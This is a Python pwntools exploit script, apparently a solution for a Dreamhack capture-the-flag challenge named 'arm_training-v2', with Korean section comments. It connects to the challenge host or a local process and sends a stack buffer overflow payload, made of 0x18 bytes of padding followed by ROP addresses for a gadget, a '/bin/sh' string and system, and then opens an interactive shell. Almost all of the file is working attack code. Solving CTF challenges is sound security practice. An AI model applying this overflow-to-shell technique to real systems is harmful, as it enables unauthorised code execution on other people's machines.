#!/usr/bin/env python3
from pwn import *

# ================= 기본 설정 =================
context.arch = "arm"
context.binary = elf = ELF('./arm_training-v2')
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

# ================= 원격 정보 =================
HOST, PORT = "host8.dreamhack.games 21304".split()

# ================= I/O =================
s   = lambda data               : p.send(data)
sa  = lambda delim, data        : p.sendafter(delim, data)
sl  = lambda data               : p.sendline(data)
sla = lambda delim, data        : p.sendlineafter(delim, data)

r   = lambda num=4096           : p.recv(num)
rl  = lambda                    : p.recvline()
ru  = lambda delim, drop=True   : p.recvuntil(delim, drop)

# ================= Leak Helpers =================
l64  = lambda : u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))

# ================= 연결 =================
if args.REMOTE:
    p = remote(HOST, int(PORT))
    #libc = ELF('./libc.so.6')
else:
    p = process()#env={"LD_PRELOAD": "./libc.so.6"})
    #libc = ELF('./libc.so.6')
    # gdb.attach(p)

# ================= 실행 =================
def slog(n, a): return success(': '.join([n, hex(a)]))

gadget = 0x103c0
binsh = 0x106a4
system = 0x10598 # system gadget

pay = b'A'*0x18
pay += p32(gadget)
pay += p32(binsh)
pay += p32(system)

sl(pay)

p.interactive()
